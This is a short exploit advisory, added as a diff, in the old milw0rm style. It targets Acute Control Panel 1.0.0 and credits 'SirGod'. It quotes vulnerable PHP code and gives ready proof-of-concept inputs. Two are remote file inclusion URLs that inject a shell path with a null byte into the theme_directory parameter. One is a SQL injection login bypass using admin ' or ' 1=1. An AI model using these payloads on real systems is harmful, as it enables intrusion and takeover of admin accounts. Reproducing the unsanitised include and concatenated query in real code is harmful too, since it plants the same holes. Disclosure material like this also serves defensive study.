@@ -1,0 +1,52 @@
+###############################################################
+[+] Acute Control Panel 1.0.0 RFI/SQL Injection (Auth Bypass)
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+###############################################################
+
+[+] Remote File Inclusion
+
+ Vulnerable code in container.php
+
+-----------------------------------------------------------
+<?php include_once($theme_directory."/sidebar.php"); ?>
+-----------------------------------------------------------
+
+ PoC :
+
+  http://127.0.0.1/themes/container.php?theme_directory=[Shell]%00
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+ Vulnerable code in header.php
+
+--------------------------------------------------------------
+<?php include_once($theme_directory."/navigation.php"); ?>
+--------------------------------------------------------------
+
+ PoC :
+
+  http://127.0.0.1/themes/header.php?theme_directory=[Shell]%00
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+[+] SQL Injection (Auth Bypass)
+
+ Vulnerable code in login.php
+
+--------------------------------------------
+$query = mysql_query("SELECT
+id,username,password,email,fullname,permissions FROM `users` WHERE
+username='$username' AND password='$password'", $conn) or
+die(mysql_error());
+--------------------------------------------
+
+ PoC :
+
+  Username : admin ' or ' 1=1
+  Password : anything or nothing
+
+################################################################
+
+# milw0rm.com [2009-03-26]
